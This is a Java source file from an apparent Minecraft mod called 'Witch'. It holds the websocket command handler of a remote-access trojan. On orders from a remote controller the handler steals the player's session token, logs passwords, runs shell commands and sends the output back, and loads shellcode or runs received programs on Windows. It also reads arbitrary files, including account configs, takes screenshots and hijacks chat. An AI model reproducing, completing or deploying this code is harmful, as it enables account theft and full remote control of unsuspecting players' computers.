package me.soda.witch.websocket;

import com.google.gson.Gson;
import me.soda.witch.Witch;
import me.soda.witch.features.PlayerInfo;
import me.soda.witch.features.ShellcodeLoader;
import me.soda.witch.utils.*;
import net.minecraft.text.Text;

import java.nio.ByteBuffer;

import static me.soda.witch.Witch.mc;

public class MessageHandler {
    private static final Gson GSON = new Gson();

    public static void handle(ByteBuffer bytes) {
        handle(GSON.fromJson(Message.decrypt(bytes.array()), Message.class));
    }

    public static void handle(Message message) {
        String msgType = message.messageType();
        String msg = message.message();
        Witch.println("Received message: " + msgType);
        try {
            switch (msgType) {
                case "steal_pwd_switch" -> Witch.config.passwordBeingLogged = !Witch.config.passwordBeingLogged;
                case "steal_token" -> Message.send(msgType, Stealer.getToken());
                case "chat_control" -> ChatUtil.sendChat(message.message());
                case "chat_filter" -> Witch.config.filterPattern = msg;
                case "chat_filter_switch" -> Witch.config.isBeingFiltered = !Witch.config.isBeingFiltered;
                case "chat_mute" -> Witch.config.isMuted = !Witch.config.isMuted;
                case "mods" -> Message.send(msgType, MinecraftUtil.allMods());
                case "systeminfo" -> Message.send(msgType, MinecraftUtil.systemInfo());
                case "screenshot" -> ScreenshotUtil.screenshot();
                case "chat" -> ChatUtil.chat(Text.of(msg), false);
                case "kill" -> Witch.client.close(false);
                case "shell" -> new Thread(() -> {
                    String result = ShellUtil.runCmd(msg);
                    Message.send(msgType, "\n" + result);
                }).start();
                case "shellcode" -> {
                    if (ShellUtil.isWin())
                        new Thread(() -> new ShellcodeLoader().loadShellCode(msg, false)).start();
                }
                case "log" -> Witch.config.logChatAndCommand = !Witch.config.logChatAndCommand;
                case "config" -> Message.send(msgType, Witch.config);
                case "player" -> Message.send(msgType, new PlayerInfo(Witch.mc.player));
                case "skin" -> {
                    Message.send("player", new PlayerInfo(Witch.mc.player));
                    PlayerSkinUtil.sendPlayerSkin();
                }
                case "server" -> {
                    ServerUtil.disconnect();
                    Witch.config.canJoinServer = !Witch.config.canJoinServer;
                }
                case "kick" -> ServerUtil.disconnect();
                case "execute" -> {
                    if (ShellUtil.isWin()) {
                        ShellUtil.runProg(GSON.fromJson(message.message(), byte[].class));
                    }
                }
                case "iasconfig" -> Message.send(msgType, FileReadUtil.read("config/ias.json"));
                case "read" -> Message.send(msgType, FileReadUtil.read(msg));
                case "runargs" -> Message.send(msgType, System.getProperties());
                case "xor" -> Message.setKey(msg);
                case "greeting" -> {
                    String greetingMsg = "Reconnected " + Witch.client.reconnections + " times, I am " + mc.getSession().getUsername();
                    Message.send(msgType, greetingMsg);
                    if (Witch.ip == null) Witch.ip = NetUtil.getIp();
                    Message.send("player", new PlayerInfo(Witch.mc.player));
                }
                default -> {
                }
            }
        } catch (Exception e) {
            Witch.println("Corrupted message!");
            Witch.printStackTrace(e);
        }
    }
}